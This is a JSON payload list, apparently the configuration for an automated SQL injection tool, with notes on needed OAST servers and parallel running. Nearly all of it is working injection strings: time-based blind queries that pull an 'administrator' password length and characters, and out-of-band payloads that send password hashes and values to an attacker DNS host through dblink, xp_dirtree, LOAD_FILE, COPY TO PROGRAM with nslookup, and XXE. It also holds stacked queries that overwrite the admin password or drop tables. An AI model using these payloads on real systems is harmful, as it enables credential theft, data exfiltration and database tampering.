{
  "lists": {
    "first_test": {
      "payloads": [
        "'",
        "''"
      ],
      "metadata": {
        "dbms": ["generic"],
        "type": "basic"
      }
    },
    "database_fingerprinting": {
      "payloads": [
        "'||(SELECT '' FROM dual)||'",
        "'||(SELECT '')||'",
        "'OR(SELECT '')OR'",
        "'+(SELECT '')+'",
        "' AND (SELECT version())--"
      ],
      "metadata": {
        "dbms": ["MySQL", "Oracle", "PostgreSQL"],
        "type": "fingerprinting"
      }
    },
    "time_fingerprints": {
      "payloads": [
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
        "'; SELECT IF(1=1, SLEEP(5), 0)-- -",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        "'; SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual--",
        "'; SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 2500000) SELECT count(*) FROM cnt) ELSE 0 END--",
        "'; SELECT sleep(5) FROM sqlite_master WHERE 1=1--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "time-based"
      }
    },
    "user_exists_payloads": {
      "payloads": [
        "';SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END--",
        "';SELECT IF(EXISTS(SELECT 1 FROM users WHERE username='administrator'), SLEEP(10), 0)-- -",
        "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator') WAITFOR DELAY '0:0:10'--",
        "';SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
        "';SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator')>0) THEN LENGTH(randomblob(50000000)) ELSE 0 END--",
        "';SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_user WHERE name='administrator') THEN sleep(10) ELSE 0 END--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "time-based"
      }
    },
    "password_length_gt2": {
      "payloads": [
        "';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{lenght}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
        "';SELECT IF((username='administrator' AND LENGTH(password)>{lenght}), SLEEP(10), 0)-- -",
        "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND LEN(password)>{lenght}) WAITFOR DELAY '0:0:10'--",
        "';SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght} THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
        "';SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')>{lenght}) THEN LENGTH(randomblob(50000000)) ELSE 0 END--",
        "';SELECT CASE WHEN (SELECT length(password) FROM sqlite_user WHERE name='administrator')>{lenght} THEN sleep(10) ELSE 0 END--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "time-based"
      }
    },
    "intruder_substring_raw": {
      "payloads": [
        "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
        "';SELECT IF((username='administrator' AND SUBSTRING(password,{position},1)='{char}'), SLEEP(10), 0)-- -",
        "'; IF EXISTS(SELECT 1 FROM users WHERE username='administrator' AND SUBSTRING(password,{position},1)='{char}') WAITFOR DELAY '0:0:10'--",
        "';SELECT CASE WHEN (SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',10) ELSE 0 END FROM dual--",
        "';SELECT CASE WHEN ((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}') THEN LENGTH(randomblob(50000000)) ELSE 0 END--",
        "';SELECT CASE WHEN (SELECT substr(password,{position},1) FROM sqlite_user WHERE name='administrator')='{char}' THEN sleep(10) ELSE 0 END--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "time-based"
      }
    },
    "oast": {
      "payloads": [
        "'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||(SELECT encode(password::bytea,'hex') FROM users WHERE username='admin')||'.{DNS} user=test dbname=test');--",
        "'; COPY (SELECT '') TO PROGRAM 'nslookup $(SELECT encode(password::bytea,'hex')).{DNS}'--",
        "'; DECLARE @p VARCHAR(255); SET @p=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree ''\\'+@p+'.{DNS}\\a''')--",
        "'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')=1 WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users WHERE username='admin'),'.{DNS}\\a'))--",
        "' UNION SELECT 1 INTO OUTFILE '\\\\{DNS}\\a' LINES TERMINATED BY (SELECT password FROM users WHERE username='admin')--",
        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{DNS}/\"> %remote;]>'),'/l') FROM dual--",
        "' UNION SELECT UTL_INADDR.get_host_address('{DNS}') FROM dual--",
        "' UNION SELECT 1 WHERE load_extension('\\\\{DNS}\\a')--",
        "' UNION SELECT 1; ATTACH DATABASE '\\\\{DNS}\\a' AS x; INSERT INTO x.t VALUES ((SELECT password FROM users WHERE username='admin'))--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "oast"
      }
    },
    "oast_pay": {
      "payloads": [
        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.{DNS}/\"> %remote;]>'),'/l') FROM dual--",
        "'; DECLARE @p NVARCHAR(4000); SET @p = (SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree ''\\'+@p+'.{DNS}\\a''')--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator' LIMIT 1),'.{DNS}\\a'))--",
        "' UNION SELECT load_extension('\\\\'||(SELECT hex(password) FROM users WHERE username='administrator')||'.{DNS}\\a')--",
        "'; ATTACH DATABASE '\\\\'||(SELECT hex(password) FROM sqlite_user WHERE name='administrator')||'.{DNS}\\a' AS x; INSERT INTO x.t VALUES ((SELECT password FROM sqlite_user WHERE name='administrator'))--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "oast"
      }
    },
    "blind_sql_time_based": {
      "payloads": [
        "'; IF (LEN((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}) WAITFOR DELAY '0:0:{delay}'--",
        "' AND IF(LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght}, SLEEP({delay}), 0)-- -",
        "' AND CASE WHEN LENGTH((SELECT {object} FROM {table} WHERE Username='Administrator')) > {lenght} THEN pg_sleep({delay}) ELSE 0 END--",
        "' AND CASE WHEN LENGTH((SELECT Password FROM Users WHERE Username='Administrator')) > 10 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END = 0--",
        "';SELECT CASE WHEN (SELECT length({object}) FROM {table} WHERE name='Administrator') > {lenght} THEN sleep({delay}) ELSE 0 END--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "time-based"
      }
    },
    "error_based": {
      "payloads": [
        "' AND 1=CAST((SELECT database()) AS INT)--",
        "' AND 1/0--",
        "'; SELECT 1/0 FROM dual--",
        "' AND (SELECT @@version) IS NULL--",
        "'; SELECT 1 WHERE (SELECT count(*) FROM sqlite_master)=1/0--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
        "type": "error-based"
      }
    },
    "stacked_queries": {
      "payloads": [
        "'; DROP TABLE temp; CREATE TABLE temp(id INT); INSERT INTO temp(id) VALUES(1); SELECT * FROM temp--",
        "'; UPDATE users SET password='hacked' WHERE username='administrator'; SELECT 1--",
        "'; ATTACH DATABASE ':memory:' AS x; CREATE TABLE x.t(id INT); INSERT INTO x.t(id) VALUES(1); SELECT * FROM x.t--"
      ],
      "metadata": {
        "dbms": ["MySQL", "PostgreSQL", "SQLite"],
        "type": "stacked"
      }
    }
  },
  "payload_weaknesses": [
    "OAST payloads require an external DNS server (e.g., Interactsh). Set up a local OAST server or use a service like Interactsh for full functionality.",
    "SQLite payloads (e.g., load_extension) require extensions to be enabled. Check target configuration before use.",
    "High payload volume may impact performance. Use parallel processing (see blind_runner.py) to mitigate."
  ]
}